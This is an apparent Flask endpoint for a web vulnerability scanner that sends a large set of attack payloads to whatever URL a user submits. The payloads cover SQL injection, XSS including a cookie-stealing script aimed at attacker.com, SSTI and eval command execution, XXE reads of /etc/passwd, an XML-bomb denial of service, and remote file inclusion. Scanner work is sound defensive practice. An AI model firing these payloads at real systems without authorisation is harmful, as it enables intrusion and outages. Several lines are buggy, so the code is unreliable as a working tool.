import requests
from flask import Blueprint, request, jsonify

vulnurabilities = Blueprint("vulnurability", __name__)

# URL of the website 
@vulnurabilities.route("/check_url/", methods=['POST'])
def vul():

    url = request.json['url']
    vulnurability = ["Distributed denial of service"]

    try:
        # Check for directory traversal vulnerability
        response = requests.get(url + "../../../../etc/passwd")
        if response.status_code == 200:
            vulnurability.append({
                "heading": "Directory Traversal Vulnerability",
                "description": "Prevention: Validate and sanitize user input, use whitelisting for allowed paths, and implement proper access controls."
            })

        # Check for SQL injection vulnerability
        payload = "1' OR '1'='1"
        response = requests.get(url + "/products?id=" + payload)
        if "error" in response.text:
            vulnurability.append.append({
                "heading": "SQL Injection Vulnerability",
                "description": "Prevention: Use parameterized queries or prepared statements, implement input validation, and employ least privilege database accounts."
            })

        # Check for XSS vulnerability
        payload = "<script>alert('XSS')</script>"
        response = requests.post(url, data={"input": payload})
        if payload in response.text:
            vulnurability.append({
                "heading": "Cross-Site Scripting (XSS) Vulnerability",
                "description": "Prevention: Implement input validation and output encoding, use Content Security Policy (CSP) headers, and sanitize user-generated content."
            })

        # Check for Command Injection vulnerability
        payload = "127.0.0.1; ls"
        response = requests.get(url + "/ping?host=" + payload)
        if "etc" in response.text:
            vulnurability.append({
                "heading": "Command Injection Vulnerability",
                "description": "Prevention: Avoid using shell commands with user input, use safe APIs, implement input validation, and employ least privilege principles."
            })

        # Check for Remote File Inclusion vulnerability
        payload = "http://attacker.com/malicious_script.php"
        response = requests.get(url + "/file?file=" + payload)
        if "Attacker's Content" in response.text:
            vulnurability.append({
                "heading": "Remote File Inclusion (RFI) Vulnerability",
                "description": "Prevention: Disable remote file inclusion if not needed, implement strict input validation, and use whitelisting for allowed file inclusions."
            })

        # Check for Server-Side Request Forgery (SSRF) vulnerability
        payload = "http://localhost/admin"
        response = requests.get(url + "/fetch?url=" + payload)
        if "Sensitive Admin Page" in response.text:
            vulnurability.append({
                "heading": "Server-Side Request Forgery (SSRF) Vulnerability",
                "description": "Prevention: Implement strict input validation, use whitelisting for allowed URLs, and restrict outbound network access."
            })

        # Check for Unvalidated Redirect vulnerability
        payload = "https://www.attacker.com"
        response = requests.get(url + "/redirect?to=" + payload)
        if "example.com" not in response.url:
            vulnurability.append({
                "heading": "Unvalidated Redirect Vulnerability",
                "description": "Prevention: Implement strict validation of redirect URLs, use whitelisting for allowed destinations, and avoid using user input directly in redirects."
            })

        # Check for Cross-Site Request Forgery (CSRF) vulnerability
        response = requests.get(url, cookies={"session_id": "malicious_session"})
        if "Unauthorized Action Performed" in response.text:
            vulnurability.append({
                "heading": "Cross-Site Request Forgery (CSRF) Vulnerability",
                "description": "Prevention: Implement anti-CSRF tokens, use SameSite cookie attribute, and validate the origin of requests."
            })

        # Check for Remote Code Execution (RCE) vulnerability
        payload = "'; system('id'); //"
        response = requests.get(url + "/command?cmd=" + payload)
        if "uid" in response.text:
            vulnurability.append({
                "heading": "Remote Code Execution (RCE) Vulnerability",
                "description": "Prevention: Avoid using eval() or similar functions with user input, implement strict input validation, and use sandboxing techniques."
            })

        # Check for Cross-Site Script Inclusion (XSSI) vulnerability
        payload = "https://www.attacker.com/xssi.js"
        response = requests.get(url + "/xssi?file=" + payload)
        if "Sensitive Information" in response.text:
            vulnurability.append({
                "heading": "Cross-Site Script Inclusion (XSSI) Vulnerability",
                "description": "Prevention: Use proper Content-Type headers, implement CORS policies, and avoid exposing sensitive data in JSONP responses."
            })

        # Check for File Upload vulnerability
        # files = {"file": open("malicious_file.php", "rb")}
        # response = requests.post(url + "/upload", files=files)
        # if "File Uploaded Successfully" in response.text:
        #     vulnurability.append("File Upload Vulnerability Detected!")

        # Check for Insecure Direct Object Reference (IDOR) vulnerability
        response = requests.get(url + "/profile?id=123")
        if "Unauthorized Access" in response.text:
            vulnurability.append({
                "heading": "Insecure Direct Object Reference (IDOR) Vulnerability",
                "description": "Prevention: Implement proper access controls, use indirect references, and validate user permissions for each request."
            })

        # Check for XML External Entity (XXE) vulnerability
        payload = "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
        response = requests.post(url, data=payload)
        if "root:x" in response.text:
            vulnurability.append({
                "heading": "XML External Entity (XXE) Vulnerability detected",
                "description": "Prevention: Disable XML external entity processing, use safe XML parsers, and implement input validation for XML data."
            })

        # Check for Server-Side Template Injection (SSTI) vulnerability
        payload = "{{7*'7'}}"
        response = requests.post(url, data={"template": payload})
        if "49" in response.text:
            vulnurability.append({
                "heading": "Server-Side Template Injection (SSTI) Vulnerability detected",
                "description": "Prevention: Avoid using user input in template contexts, use a template engine with proper sandboxing, and implement input validation."
            })

        # Check for Remote Code Inclusion (RCI) vulnerability
        payload = "https://attacker.com/malicious_script.php"
        response = requests.get(url + "?file=" + payload)
        if "Attacker's Code Executed" in response.text:
            vulnurability.append({
                "heading": "Remote Code Inclusion (RCI) vulnerability detected",
                "description": "Prevention: Update software and patching vulnerabilities. Regularly update software and apply patches to fix security vulnerabilities, reducing the risk of exploitation by attackers."
            })
             

        # Check for Server-Side Template Injection (SSTI) vulnerability (for specific templating engines like Jinja2)
        payload = "{{ ''._class.__mro[1].__subclasses_()[80]('id') }}"
        response = requests.post(url, data={"template": payload})
        if "uid" in response.text:
            vulnurability.append({
                "heading": "Server-Side Template Injection (SSTI) Vulnerability",
                "description": "Prevention: Encode user inputs before inserting them into HTML, JavaScript, or SQL contexts."
            })

        # Check for Insecure Deserialization vulnerability
        payload = {"data": "H4sIAAAAAAAA//NIzcnJVyjPL8pJUQQAAP//"}
        response = requests.post(url, data=payload)
        if "Command Executed Successfully" in response.text:
            vulnurability.append({
                "heading": "Insecure Deserialization Vulnerability",
                "description": "Prevention: Avoid deserializing untrusted data, use secure deserialization libraries, and implement integrity checks on serialized data."
            })

        # Check for Server-Side Request Forgery (SSRF) via DNS rebinding vulnerability
        payload = "http://internal-server.local"
        response = requests.get(url + "/api?endpoint=" + payload)
        if "Internal Resource Contents" in response.text:
            vulnurability.append("Server-Side Request Forgery (SSRF) via DNS rebinding Vulnerability Detected!")

        # Check for Clickjacking vulnerability
        response = requests.get(url)
        if "DENY" not in response.headers.get("X-Frame-Options", ""):
            vulnurability.append({
                "heading": "Clickjacking Vulnerability",
                "description": "Prevention: Implement X-Frame-Options or Content Security Policy (CSP) headers to prevent framing of your site."
            })

        # Check for Security Misconfiguration
        response = requests.get(url + "/admin")
        if response.status_code == 200 and "Default Credentials" in response.text:
            vulnurability.append({
                "heading": "Security Misconfiguration Vulnerability",
                "description": "Prevention: Follow security best practices, use secure default configurations, and regularly update and patch systems."
            })

        # Check for Cross-Site Scripting (XSS) via DOM-based vulnerability
        payload = "<script>document.location='https://attacker.com/steal?cookie='+document.cookie;</script>"
        response = requests.post(url, data={"input": payload})
        if "Attacker's Domain" in response.text:
            vulnurability.append("Cross-Site Scripting (XSS) via DOM-based Vulnerability Detected!")

        # Check for Open Redirect vulnerability
        payload = "https://www.attacker.com"
        response = requests.get(url + "?redirect=" + payload)
        if "example.com" not in response.url:
            vulnurability.append({
                "heading": "Open Redirect Vulnerability",
                "description": "Prevention: Implement strict validation of redirect URLs, use whitelisting for allowed destinations, and avoid using user input directly in redirects."
            })

        # Check for Cross-Origin Resource Sharing (CORS) misconfiguration
        response = requests.get(url)
        if response.headers.get("Access-Control-Allow-Origin", "") == "*":
            vulnurability.append({
                "heading": "Cross-Origin Resource Sharing (CORS) Misconfiguration",
                "description": "Prevention: Implement proper CORS policies, avoid using wildcard origins, and validate the origin of requests."
            })

        # Check for HTTP Header Injection vulnerability
        # payload = "User-Agent: Malicious/1.0\r\nX-Forwarded-For: 127.0.0.1\r\n"
        # response = requests.get(url, headers={"Injection": payload})
        # if "Malicious Response" in response.text:
        #     vulnurability.append("HTTP Header Injection Vulnerability Detected!")

        # Check for Cross-Site Script Inclusion (XSSI) via JSON vulnerability
        payload = ")]}', {'data': '<script>document.location='https://attacker.com/steal?cookie='+document.cookie;</script>'}"
        response = requests.get(url + "/data?format=json", headers={"Accept": "application/json"})
        if "Attacker's Domain" in response.text:
            vulnurability.append({"heading":"Cross-Site Script Inclusion (XSSI) via JSON Vulnerability Detected!",
                                  "description":"Prevention :Use a library like XSS to sanitize the input, ensuring that any HTML tags or JavaScript are rendered harmless."})

        # Check for Content Security Policy (CSP) bypass
        response = requests.get(url)
        if "unsafe-inline" in response.headers.get("Content-Security-Policy", ""):
            vulnurability.append({"heading":"Content Security Policy (CSP) Bypass Vulnerability Detected!",
                                  "description":"Prevention : Implement a strict CSP policy that disallows unsafe-inline scripts and styles, and use nonces or hashes for trusted scripts."})

        # Check for Insecure Cross-Origin Resource Sharing (CORS) configuration
        response = requests.get(url)
        if response.headers.get("Access-Control-Allow-Credentials", "") == "true":
            vulnurability.append({"heading":"Insecure Cross-Origin Resource Sharing (CORS) Configuration Detected!",
                                  "description":"Prevention : Avoid using the 'Access-Control-Allow-Credentials' header with 'Access-Control-Allow-Origin' set to '*'. Use a specific origin instead."})

        # Check for HTTP Parameter Pollution vulnerability
        payload = {"param": "value1", "param": "value2"}
        response = requests.get(url, params=payload)
        if response.status_code == 200 and "Data Corruption Detected" in response.text:
            vulnurability.append({"heading":"HTTP Parameter Pollution Vulnerability Detected!",
                                  "description":"Prevention : Validate and sanitize user input, use proper data structures for parameters, and avoid duplicate parameter names."})

        # Check for Server-Side Request Forgery (SSRF) via File Upload vulnerability
        # files = {"file": open("file.txt", "rb")}
        # response = requests.post(url + "/upload", files=files, data={"path": "file:///etc/passwd"})
        # if "root:x" in response.text:
        #     vulnurability.append("Server-Side Request Forgery (SSRF) via File Upload Vulnerability Detected!")

        # Check for Insufficient Transport Layer Protection
        response = requests.get(url)
        if "Password Input Form" in response.text and "https://" not in response.text:
            vulnurability.append({"heading":"Insufficient Transport Layer Protection Vulnerability Detected!",
                                  "description":"Prevention : Use HTTPS for all sensitive data transmission, implement HSTS headers, and avoid mixed content on secure pages."})

        # Check for Business Logic Flaws
        response = requests.post(url + "/checkout", data={"item_id": "123", "price": "0.01"})
        if response.status_code == 200 and "Payment Accepted" not in response.text:
            vulnurability.append({"heading":"Business Logic Flaw Vulnerability Detected!",
                                  "description":"Prevention : Implement proper access controls, validate user inputs, and use secure coding practices to prevent business logic vulnerabilities."})

        # Check for Insecure Cross-Site WebSocket Hijacking
        payload = "wss://attacker.com"
        response = requests.get(url + "/ws?endpoint=" + payload)
        if "Attacker's WebSocket Connection" in response.text:
            vulnurability.append({"heading":"Insecure Cross-Site WebSocket Hijacking Vulnerability Detected!",
                                  "description":"Prevention : Validate WebSocket URLs, use secure WebSocket protocols, and implement proper access controls for WebSocket connections."})

        # Check for Server-Side Request Forgery (SSRF) via Server-Side Template Injection (SSTI)
        payload = "{{config._class.__init.__globals_['os'].popen('id').read()}}"
        response = requests.post(url, data={"template": payload})
        if "uid" in response.text:
            vulnurability.append({"heading":"SSRF via SSTI Vulnerability Detected!",
                                  "description":"Prevention : Avoid using user input in template contexts, use a template engine with proper sandboxing, and implement input validation."})

        # Check for Server-Side Request Forgery (SSRF) via DNS Rebinding
        payload = "http://internal-server.local"
        response = requests.get(url + "/api?endpoint=" + payload)
        if "Internal Resource Contents" in response.text:
            vulnurability.append({"heading":"SSRF via DNS Rebinding Vulnerability Detected!",
                                  "description":"Prevention : Implement strict input validation, use whitelisting for allowed URLs, and restrict outbound network access."})

        # Check for Cross-Site Script Inclusion (XSSI) via JSONP
        payload = "<script src='https://attacker.com/xssi.js'></script>"
        response = requests.get(url + "/data?callback=" + payload)
        if "Sensitive Information" in response.text:
            vulnurability.append({"heading":"XSSI via JSONP Vulnerability Detected!",
                                  "description":"Prevention : Avoid using JSONP for cross-origin requests, use CORS policies, and avoid exposing sensitive data in JSONP responses."})

        # Check for Server-Side Denial of Service (DoS) via XML Bomb
        payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE bomb [<!ENTITY a "&#x26;#x41;"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;"><!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;"><!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;"><!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;"><!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;"><!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;"><!ENTITY k "&j;&j;&j;&j;&j;&j;&j;&j;&j;&j;"><!ENTITY l "&k;&k;&k;&k;&k;&k;&k;&k;&k;&k;"><!ENTITY m "&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;"><!ENTITY n "&m;&m;&m;&m;&m;&m;&m;&m;&m;&m;"><!ENTITY o "&n;&n;&n;&n;&n;&n;&n;&n;&n;&n;"><!ENTITY p "&o;&o;&o;&o;&o;&o;&o;&o;&o;&o;"><!ENTITY q "&p;&p;&p;&p;&p;&p;&p;&p;&p;&p;"><!ENTITY r "&q;&q;&q;&q;&q;&q;&q;&q;&q;&q;"><!ENTITY s "&r;&r;&r;&r;&r;&r;&r;&r;&r;&r;"><!ENTITY t "&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;"><!ENTITY u "&t;&t;&t;&t;&t;&t;&t;&t;&t;&t;"><!ENTITY v "&u;&u;&u;&u;&u;&u;&u;&u;&u;&u;"><!ENTITY w "&v;&v;&v;&v;&v;&v;&v;&v;&v;&v;"><!ENTITY x "&w;&w;&w;&w;&w;&w;&w;&w;&w;&w;"><!ENTITY y "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;"><!ENTITY z "&y;&y;&y;&y;&y;&y;&y;&y;&y;&y;">]><root>&z;</root>'
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            vulnurability.append({"heading":"Server-Side DoS via XML Bomb Vulnerability Detected!",
                                  "description":"Prevention : Disable XML external entity processing, use safe XML parsers, and implement input validation for XML data."})

        # Check for Security Headers Misconfiguration
        response = requests.get(url)
        if "Content-Security-Policy" not in response.headers:
            vulnurability.append({"heading":"Security Headers Misconfiguration Detected!",
                                  "description":"Prevention : Implement security headers like Content-Security-Policy, X-Content-Type-Options, X-Frame-Options, and X-XSS-Protection to enhance security."})

        # Check for Cross-Site Request Forgery (CSRF) via Flash
        payload = '''
        <!DOCTYPE html>
        <html>
        <body>
            <h1>CSRF via Flash</h1>
            <object data="https://attacker.com/flash.swf"></object>
        </body>
        </html>
        '''
        response = requests.post(url, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})
        if "Unauthorized Action Performed" in response.text:
            vulnurability.append({"heading":"CSRF via Flash Vulnerability Detected!",
                                  "description":"Prevention : Implement anti-CSRF tokens, use SameSite cookie attribute, and validate the origin of requests."})

        # Check for Server-Side Template Injection (SSTI) via Twig
        payload = "{{7*'7'}}"
        response = requests.post(url, data={"template": payload})
        if "49" in response.text:
            vulnurability.append({"heading":"SSTI via Twig Vulnerability Detected!",
                                  "description":"Prevention : Avoid using user input in template contexts, use a template engine with proper sandboxing, and implement input validation."})

        # Check for Cross-Site Scripting (XSS) via SVG
        payload = '''
        <svg xmlns="http://www.w3.org/2000/svg">
        <script>alert('XSS')</script>
        </svg>
        '''
        response = requests.post(url, data={"input": payload})
        if payload in response.text:
            vulnurability.append({"heading":"XSS via SVG Vulnerability Detected!",
                                  "description":"Prevention : Implement input validation and output encoding, use Content Security Policy (CSP) headers, and sanitize user-generated content."})

        # Check for Server-Side Request Forgery (SSRF) via XXE
        payload = '''
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [<!ENTITY % remote SYSTEM "http://internal-server.local"> %remote;]>
        <root></root>
        '''
        response = requests.post(url, data=payload)
        if "Internal Resource Contents" in response.text:
            vulnurability.append({"heading":"SSRF via XXE Vulnerability Detected!",
                                  "description":"Prevention : Implement strict input validation, use whitelisting for allowed URLs, and restrict outbound network access."})

        # Check for Open Redirect vulnerability via data: URL
        payload = "data:text/html;base64,PHNjcmlwdD5hbGVydCgnSFRUUCBXSVRIIFJFUE9SVCcpPC9zY3JpcHQ+"
        response = requests.get(url + "?redirect=" + payload)
        if "example.com" not in response.url:
            vulnurability.append({"heading":"Open Redirect via data: URL Vulnerability Detected!",
                                  "description":"Prevention : Implement strict validation of redirect URLs, use whitelisting for allowed destinations, and avoid using user input directly in redirects."})

        # Check for Insecure Direct Object Reference (IDOR) vulnerability
        response = requests.get(url + "/profile?id=999")
        if "Unauthorized Access" in response.text:
            vulnurability.append({"heading":"IDOR Vulnerability Detected!",
                                  "description":"Prevention : Implement proper access controls, use indirect references, and validate user permissions for each request."})

        # Check for SQL Injection vulnerability via UNION-based attack
        payload = "1' UNION SELECT null,version(),user()--"
        response = requests.get(url + "/products?id=" + payload)
        if "error" in response.text:
            vulnurability.append({"heading":"SQL Injection via UNION-Based Attack Vulnerability Detected!",
                                  "description":"Prevention : Use parameterized queries or prepared statements, implement input validation, and employ least privilege database accounts."})

        # Check for XML External Entity (XXE) vulnerability
        payload = '''
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [<!ENTITY % remote SYSTEM "http://internal-server.local"> %remote;]>
        <root></root>
        '''
        response = requests.post(url, data=payload)
        if "Internal Resource Contents" in response.text:
            vulnurability.append({"heading":"XXE Vulnerability Detected!",
                                  "description":"Prevention : Disable XML external entity processing, use safe XML parsers, and implement input validation for XML data."})

        # Check for Remote File Inclusion (RFI) vulnerability
        payload = "http://attacker.com/malicious-script.php"
        response = requests.get(url + "?file=" + payload)
        if "Malicious Content" in response.text:
            vulnurability.append({"heading":"RFI Vulnerability Detected!",
                                  "description":"Prevention : Disable remote file inclusion if not needed, implement strict input validation, and use whitelisting for allowed file inclusions."})

        # Check for Unvalidated Redirect vulnerability
        redirect_url = "https://malicious-site.com"
        response = requests.get(url + "?redirect=" + redirect_url)
        if redirect_url not in response.url:
            vulnurability.append({"heading":"Unvalidated Redirect Vulnerability Detected!",
                                  "description":"Prevention : Implement strict validation of redirect URLs, use whitelisting for allowed destinations, and avoid using user input directly in redirects."})

        # Check for Command Injection vulnerability
        command = "ls /tmp"
        payload = f"test; {command};"
        response = requests.get(url + "?param=" + payload)
        if "file1.txt" in response.text:
            vulnurability.append({"heading":"Command Injection Vulnerability Detected!",
                                  "description":"Prevention : Avoid using shell commands with user input, use safe APIs, implement input validation, and employ least privilege principles."})

        # Check for Local File Inclusion (LFI) vulnerability
        file_path = "/etc/passwd"
        payload = f"../../../../../../..{file_path}"
        response = requests.get(url + "?file=" + payload)
        if "root:x:0:0" in response.text:
            vulnurability.append({"heading":"LFI Vulnerability Detected!",
                                  "description":"Prevention : Avoid using user input in file paths, use whitelisting for allowed files, and restrict access to sensitive files."})

        # Check for Cross-Site Scripting (XSS) via JavaScript execution
        payload = "<img src=x onerror=alert('XSS')>"
        response = requests.post(url, data={"input": payload})
        if payload in response.text:
            vulnurability.append({"heading":"XSS via JavaScript Execution Vulnerability Detected!",
                                  "description":"Prevention : Implement input validation and output encoding, use Content Security Policy (CSP) headers, and sanitize user-generated content."})

        # Check for Remote Code Execution (RCE) vulnerability via deserialization
        payload = "gAN9cQAoWAUAAABkYXRhYmFzZXF0eXBlCnEAXgAAAGV4aXQoKVgFAAAAaW5jbHVkaW5nCnEARgBAAAAAA=="
        response = requests.post(url, data=payload)
        if "RCE Successful" in response.text:
            vulnurability.append({"heading":"RCE via Deserialization Vulnerability Detected!"}, 
                                  {"description":"Prevention : Avoid deserializing untrusted data, use secure deserialization libraries, and implement integrity checks on serialized data."})

        # Check for Cross-Site Scripting (XSS) via HTML injection
        payload = "<script>alert('XSS')</script>"
        response = requests.post(url, data={"input": payload})
        if payload in response.text:
            vulnurability.append({"heading":"XSS via HTML Injection Vulnerability Detected!",
                                  "description":"Prevention : Implement input validation and output encoding, use Content Security Policy (CSP) headers, and sanitize user-generated content."})

        # Check for File Upload vulnerability
        file_content = b"<html><body><h1>Uploaded File</h1></body></html>"
        files = {"file": ("uploaded.html", file_content)}
        response = requests.post(url, files=files)
        if "Upload Successful" in response.text:
            vulnurability.append({"heading": "File Upload Vulnerability Detected!",
                                  "description":"Prevention : Validate file types and extensions, restrict file permissions, and scan uploaded files for malware."})

        # Check for Cross-Site Scripting (XSS) via Stored XSS
        payload = "<script>alert('XSS')</script>"
        response = requests.post(url, data={"comment": payload})
        if payload in response.text:
            vulnurability.append({"heading":"Stored XSS Vulnerability Detected!",
                                  "description":"Prevention : Implement input validation and output encoding, use Content Security Policy (CSP) headers, and sanitize user-generated content."})

        # Check for Cross-Site Request Forgery (CSRF) vulnerability
        response = requests.post(url, data={"action": "delete", "id": "123"})
        if "Action Successful" in response.text:
            vulnurability.append({"heading":"CSRF Vulnerability Detected!",
                                  "description":"Prevention : Implement anti-CSRF tokens, use SameSite cookie attribute, and validate the origin of requests."})

        # Check for Remote Code Execution (RCE) vulnerability via eval
        payload = "eval('_import_(\\'os\\').popen(\\'id\\').read()')"
        response = requests.post(url, data={"input": payload})
        if "uid" in response.text:
            vulnurability.append({"heading":"RCE via eval Vulnerability Detected!",
                                  "description":"Prevention : Avoid using eval() or similar functions with user input, implement strict input validation, and use sandboxing techniques."})

        # Check for Cross-Site Scripting (XSS) via DOM-based XSS
        payload = "<script>document.write(document.domain)</script>"
        response = requests.post(url, data={"input": payload})
        if payload in response.text:
            vulnurability.append({"heading":"DOM-based XSS Vulnerability Detected!",
                                  "description":"Prevention : Implement input validation and output encoding, use Content Security Policy (CSP) headers, and sanitize user-generated content."})

        # Check for Command Injection vulnerability via shell metacharacters
        command = "ls /tmp"
        payload = f"test; {command}"
        response = requests.get(url + "?param=" + payload)
        if "file1.txt" in response.text:
            vulnurability.append({"heading":"Command Injection Vulnerability Detected!",
                                  "description":"Prevention : Avoid using shell commands with user input, use safe APIs, implement input validation, and employ least privilege principles."})

        # Check for Insecure Deserialization vulnerability
        payload = "gAN9cQBYAQAAAGV4ZWN1dGlvbl90aW1lcXVhbGl0eQFyBAAAAHRpbWVvdXQKWAUAAABleGVjdXRpb25faWQKcQFXAQAAAGlkcQJYBAAAAGFjdGl2ZV9pZApxAkcBAAAAZGF0YXRhYmluZC5jb21fXwBWAUAAAHRpbWUKcQ1SAAAAZGF0YXRhYmluZC5jb21fXwFeAQAAD3N0cmluZ19mcm9udF90aW1lCnFhSgAAAHZhbHVlCnEKSgMAAAByZWxlYXNlCnEKVgUAAABpZApxCUQCAAAAZGF0YXRhYmluZC5jb21fXwBWAUAAAHRpbWUKcQhLAwAAAHN0cmluZ19mcm9udF90aW1lCnEKYUsCAAAAdmFsdWUKcQpSAAAAZGF0YXRhYmluZC5jb21fXwFeAQAAD3N0cmluZ19mcm9udF90aW1lCnFRawAAAA=="
        response = requests.post(url, data=payload)
        if "Insecure Deserialization Detected!" in response.text:
            vulnurability.append({"heading":"Insecure Deserialization Vulnerability Detected!",
                                  "description":"Prevention : Avoid deserializing untrusted data, use secure deserialization libraries, and implement integrity checks on serialized data."})
  
    except Exception as e:
        vulnurability.append("An error occurred: " + str(e))

    return jsonify(vulnurability),200
